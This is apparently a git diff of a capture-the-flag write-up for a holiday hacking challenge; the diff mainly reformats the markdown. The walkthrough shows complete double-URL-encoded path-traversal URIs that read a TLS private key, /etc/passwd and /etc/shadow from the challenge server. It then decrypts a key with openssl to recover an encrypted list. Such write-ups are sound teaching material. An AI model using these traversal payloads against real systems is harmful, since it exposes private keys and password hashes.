@@ -95,45 +95,64 @@ To do this we need to replace the `statusid` portion of the URI with a relative 
 ![image](https://github.com/user-attachments/assets/2b48e324-54ee-4842-8d65-bf468d3165a1)
 
 
-Having figured all of that out we can now try making a call to `https://api.frostbit.app/view/..%252Fstatic%252Ffrostbit.png/**{UUID}**/status?digest={DIGEST}&debug=true`  and we get a beautiful error message saying that we have an incorrect digest.  This is a good sign, because normally just by changing the `statusid` arbitrarily we’d get a “_file not found_” error, but this new error means that the relative file path we provided was correctly processed, the file <ins>_was_</ins> found, but the server is refusing to show it to us because we are supplying the wrong digest – but based on what we learned from the python script so far, we should be able to get around that too now.
+Having figured all of that out we can now try making a call to `https://api.frostbit.app/view/..%252Fstatic%252Ffrostbit.png/{UUID}/status?digest={DIGEST}&debug=true`  and we get a beautiful error message saying that we have an incorrect digest.  This is a good sign, because normally just by changing the `statusid` arbitrarily we’d get a “_file not found_” error, but this new error means that the relative file path we provided was correctly processed, the file <ins>_was_</ins> found, but the server is refusing to show it to us because we are supplying the wrong digest – but based on what we learned from the python script so far, we should be able to get around that too now.
 
-There is one more thing that we can observe by playing around with the `statusid` portion of the URI.  That is that nginx allows us to enter any directory – even one that doesn’t exist, as long as we leave it again with `../`.  So for example, to access `frostbit.png` we can use the path `foobar/../../static/frostbit.png` and we will get the same result as for `../static/frostbit.png`, so the URL would look something like this: `https://api.frostbit.app/view/foobar%252F..%252F..%252Fstatic%252Ffrostbit.png/**{UUID}**/status?digest=**{DIGEST}**&debug=true`.
+There is one more thing that we can observe by playing around with the `statusid` portion of the URI.  That is that nginx allows us to enter any directory – even one that doesn’t exist, as long as we leave it again with `../`.  So for example, to access `frostbit.png` we can use the path `foobar/../../static/frostbit.png` and we will get the same result as for `../static/frostbit.png`, so the URL would look something like this: `https://api.frostbit.app/view/foobar%252F..%252F..%252Fstatic%252Ffrostbit.png/{UUID}/status?digest={DIGEST}&debug=true`.
 
-But, what file should we actually by trying to fetch from the server?  You may recall a reference to the **Frostbit API** in an earlier Objective.  In fact, in [Objective 13 – Santa Vision](#OBJECTIVE%2013%20-%20Santa%20Vision.md), [one of the MQTT streams](OBJECTIVE%2013%20-%20Santa%20Vision.md) gives us an interesting file path: `/etc/nginx/certs/api.frostbit.app.key`.
+But, what file should we actually by trying to fetch from the server?  You may recall a reference to the **Frostbit API** in an earlier Objective.  In fact, in [Objective 13 – Santa Vision](OBJECTIVE%2013%20-%20Santa%20Vision.md), [one of the MQTT streams](OBJECTIVE%2013%20-%20Santa%20Vision.md#santa-vision-c) gives us an interesting file path: `/etc/nginx/certs/api.frostbit.app.key`.
 
 In our case the file path needs to be relative to where our python script is stored.  We know that the python script is in `/app/frostbit/ransomware/static` directory, so we need at least four `../` to go back to `root` and another `../` to escape the false directory name composed of **{nonce}{nonce}**, so `/../../../../../etc/nginx/certs/api.frostbit.app.key`.
 
 The **{nonce}** values need to be passed as hex in the URI.  Normally we’d achieve this by prepending each hex byte pair with a `%` symbol, but just like we did with the file path, we need to _double_ URL encode hex values and represent each `%` symbol as `%25` instead.
 
 To summarise everything, essentially what needs to be done is to construct a URI that looks something like this:
-https://api.frostbit.app/view/{padding}{nonce}{nonce}{filepath}/{UUID}/ status?digest=00000000000000000000000000000000&debug=true
-Keep in mind that {filepath} needs to have an extra ../ at the beginning to exit the false directory we are passing as {padding}{nonce}{nonce}.
+`https://api.frostbit.app/view/{padding}{nonce}{nonce}{filepath}/{UUID}/ status?digest=00000000000000000000000000000000&debug=true`
+Keep in mind that **{filepath}** needs to have an extra `../` at the beginning to exit the false directory we are passing as **{padding}{nonce}{nonce}**.
+
 Here are the individual components and how they were constructed in the URI:
-{nonce}{nonce} : 	bf57c4e5ed6cb751bf57c4e5ed6cb751
-URL encoded {nonce}{nonce}:	%bf%57%c4%e5%ed%6c%b7%51%bf%57%c4%e5%ed%6c%b7%51
-Double URL encoded {nonce}{nonce}:  	%25bf%2557%25c4%25e5%25ed%256c%25b7%2551%25bf%2557%25c4%25e5%25ed%256c%25b7%2551
 
-{filepath}:	/../../../../../etc/nginx/certs/api.frostbit.app.key
-URL encoded {filepath}: 	%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fnginx%2Fcerts%2Fapi.frostbit.app.key
-Double URL encoded {filepath}:
-%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fnginx%252Fcerts%252Fapi.frostbit.app.key
+**{nonce}{nonce}**: 	`bf57c4e5ed6cb751bf57c4e5ed6cb751`
 
-In my case I didn’t need to add any padding characters, but if required you can add characters before the nonces, one at a time until the URI resolves.  The final URI when putting everything together looks like this (The blue part is the nonce and the red part is the relative file path):
-https://api.frostbit.app/view/%25bf%2557%25c4%25e5%25ed%256c%25b7%2551%25bf%2557%25c4%25e5%25ed%256c%25b7%2551%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fnginx%252Fcerts%252Fapi.frostbit.app.key/a0870d85-09c6-440a-b878-f7cc8253bf24/status?digest=00000000000000000000000000000000&debug=true 
-This URI displays the contents of api.frostbit.app.key in the debug data area of the ransom note page and we can copy the text and save it to a .key file.
-Just for fun we can also try looking at the contents of /etc/passwd, /etc/shadow and /etc/os-release using the same method (adjusting the number of padding characters before the nonces each time):
-/etc/passwd:
-https://api.frostbit.app/view/aaaaaaa%25bf%2557%25c4%25e5%25ed%256c%25b7%2551%25bf%2557%25c4%25e5%25ed%256c%25b7%2551%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd/a0870d85-09c6-440a-b878-f7cc8253bf24/status?digest=00000000000000000000000000000000&debug=true 
-/etc/shadow:
-https://api.frostbit.app/view/aaaaaaaaaaa%25bf%2557%25c4%25e5%25ed%256c%25b7%2551%25bf%2557%25c4%25e5%25ed%256c%25b7%2551%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fshadow/a0870d85-09c6-440a-b878-f7cc8253bf24/status?digest=00000000000000000000000000000000&debug=true 
-/etc/os-release:
-https://api.frostbit.app/view/aaaa%25bf%2557%25c4%25e5%25ed%256c%25b7%2551%25bf%2557%25c4%25e5%25ed%256c%25b7%2551%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fos-release/a0870d85-09c6-440a-b878-f7cc8253bf24/status?digest=00000000000000000000000000000000&debug=true
+URL-encoded **{nonce}{nonce}**:	`%bf%57%c4%e5%ed%6c%b7%51%bf%57%c4%e5%ed%6c%b7%51`
 
-Now that we have the .key file used to encrypt the encryptedkey value we saw in the TLS session earlier, we can use it to decrypt it.  First, we need to convert the   encryptedkey to hex and save it to a bin file:
+Double URL-encoded **{nonce}{nonce}**:  	`%25bf%2557%25c4%25e5%25ed%256c%25b7%2551%25bf%2557%25c4%25e5%25ed%256c%25b7%2551`
+
+**{filepath}**:	`/../../../../../etc/nginx/certs/api.frostbit.app.key`
+
+URL-encoded **{filepath}**: 	`%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fnginx%2Fcerts%2Fapi.frostbit.app.key`
+
+Double URL-encoded **{filepath}**:  `%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fnginx%252Fcerts%252Fapi.frostbit.app.key`
+
+In my case I didn’t need to add any padding characters, but if required you can add characters before the nonces, one at a time until the URI resolves.  The final URI when putting everything together looks like this:
+
+``https://api.frostbit.app/view/%25bf%2557%25c4%25e5%25ed%256c%25b7%2551%25bf%2557%25c4%25e5%25ed%256c%25b7%2551%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fnginx%252Fcerts%252Fapi.frostbit.app.key/a0870d85-09c6-440a-b878-f7cc8253bf24/status?digest=00000000000000000000000000000000&debug=true``
+
+This URI displays the contents of `api.frostbit.app.key` in the debug data area of the ransom note page and we can copy the text and save it to a `.key` file.
+
+Just for fun we can also try looking at the contents of `/etc/passwd`, `/etc/shadow` and `/etc/os-release` using the same method (adjusting the number of padding characters before the nonces each time):
+
+**/etc/passwd:**
+```https://api.frostbit.app/view/aaaaaaa%25bf%2557%25c4%25e5%25ed%256c%25b7%2551%25bf%2557%25c4%25e5%25ed%256c%25b7%2551%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd/a0870d85-09c6-440a-b878-f7cc8253bf24/status?digest=00000000000000000000000000000000&debug=true ```
+
+**/etc/shadow:**
+```https://api.frostbit.app/view/aaaaaaaaaaa%25bf%2557%25c4%25e5%25ed%256c%25b7%2551%25bf%2557%25c4%25e5%25ed%256c%25b7%2551%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fshadow/a0870d85-09c6-440a-b878-f7cc8253bf24/status?digest=00000000000000000000000000000000&debug=true ```
+
+**/etc/os-release:**
+```https://api.frostbit.app/view/aaaa%25bf%2557%25c4%25e5%25ed%256c%25b7%2551%25bf%2557%25c4%25e5%25ed%256c%25b7%2551%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fos-release/a0870d85-09c6-440a-b878-f7cc8253bf24/status?digest=00000000000000000000000000000000&debug=true```
+
+Now that we have the `.key` file used to encrypt the `encryptedkey` value we saw in the TLS session earlier, we can use it to decrypt it.  First, we need to convert the `encryptedkey` to hex and save it to a `.bin` file:
+
+```bash
 └─# echo -n "9e3a9c904a0beca..." | xxd -r -p > encryptedkey.bin 
 Next, we can use openssl to decrypt the key:
 └─# openssl pkeyutl -decrypt -inkey api.frostbit.app.key -in encryptedkey.bin -out decryptedkey
 └─# cat decryptedkey    
 d23c052542a2ad32e86f9d5bbc66b11e,bf57c4e5ed6cb751    
+```
 
-Now we have the key that was presumably used to encrypt the naughty-nice csv file.  The decrypted key gives us two comma-separated values, which means that we’re probably looking at some kind of AES encryption which uses a Key and Initial Value.  Since we don’t know exactly which AES mode was used, I found it easiest to upload the encrypted csv file to Cyberchef, paste in the Key and IV values and try a few options for Mode until I got a legible output.
+Now we have the key that was presumably used to encrypt the naughty-nice csv file.  The decrypted key gives us two comma-separated values, which means that we’re probably looking at some kind of AES encryption which uses a **Key** and **Initial Value**.  Since we don’t know exactly which AES mode was used, I found it easiest to upload the encrypted csv file to [Cyberchef](https://icyberchef.com/), paste in the **Key** and **IV** values and try a few options for Mode until I got a legible output.
+
+![image](https://github.com/user-attachments/assets/881af2a6-cf78-499d-b726-58c595086d53)
+
+
+Finally, we can look inside the decrypted naughty-nice list and find out who is the last child on the list at line number 440, and we find it’s a child called <ins>**Xena Xtreme**</ins> who is listed as having been naughty for having _“a surprise science experiment in the garage and [leaving] a mess with the supplies”_.
